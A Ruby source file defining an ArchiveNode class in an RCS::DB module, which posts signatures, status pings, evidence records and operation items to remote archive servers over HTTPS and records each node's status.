require 'thread'
require 'rest-client'
require 'rcs-common/trace'
require 'em-http-request'
require_relative 'db_objects/status'
require_relative 'db_objects/signature'

module RCS
  module DB
    class ArchiveNode
      include RCS::Tracer
      extend RCS::Tracer

      attr_reader :address

      def initialize(address)
        @address = address
      end

      def signature
        Signature.where(scope: 'network').first.try(:value)
      end

      def status
        ::Status.where(address: address, type: 'archive').first
      end

      def setup!
        body = {signatures: ::Signature.all}
        request("/sync/setup", body)
      end

      def ping!
        request("/sync/status") do |code, content|
          if code == 200
            update_status(content[:status])
          else
            update_status(status: ::Status::ERROR, info: content[:msg])
            setup! if content[:code] == 2 #NEED_SIGNATURES
          end
        end
      end

      def send_evidence(evidence, path)
        body = {evidence: evidence, path: path}

        request("/sync/evidence", body, on_error: :raise) do |code, content|
          if content[:code] == 4 #NEED_ITEMS
            send_items(content[:operation_id])
            send_evidence(evidence, path)
          end
        end
      end

      def send_items(operation_id)
        body = {items: ::Item.operation_items_sorted_by_kind(operation_id)}
        request("/sync/items", body, on_error: :raise)
      end

      def request(path, body = {}, opts = {})
        url = "https://#{address}#{path}"
        body = body.respond_to?(:to_json) ? body.to_json : body
        trace :debug, "POST #{address} (archive) #{path} #{body[0..60]}..."
        headers = {x_sync_signature: signature}
        # TODO: Check if restclient has implemented the keepalive feature otherwise use net/http/persistent
        RestClient::Request.execute(:method => :post, :url => url, :payload => body, :headers => headers, :timeout => 3, :open_timeout => 3) do |resp|
          trace :debug, "RESP #{resp.code} from #{address} (archive) #{resp.body[0..60]}..."
          content = JSON.parse(resp.body).symbolize_keys rescue {}
          raise(content[:msg] || "Receive error #{resp.code} from #{address}") if resp.code != 200 and opts[:on_error] == :raise
          yield(resp.code, content) if block_given?
        end
      rescue Exception => error
        trace :error, "POST ERROR #{address} (archive) #{path} #{error}"
        error_msg = ["Unable to reach #{address}", error.message].join(', ')
        raise(error_msg) if opts[:on_error] == :raise
        yield(-1, {msg: error_msg}) if block_given?
      end

      def update_status(attributes)
        current = status.try(:attributes) || {}
        attributes = current.symbolize_keys.merge(attributes.symbolize_keys)
        stats = attributes.reject { |key| ![:disk, :cpu, :pcpu].include?(key) }
        status_code = ::Status::STATUS_CODE.find { |key, val| val == attributes[:status] }.try(:first) || attributes[:status]
        params = ["RCS::DB (Archive)", address, status_code, attributes[:info], stats, 'archive', attributes[:version]]

        ::Status.status_update(*params)
      end

      def destroy
        status.try(:destroy)
      end

      def self.all
        addresses = ::Connector.where(type: 'archive').only(:dest).distinct(:dest)
        addresses.map! { |addr| new(addr) }
      end
    end
  end
end
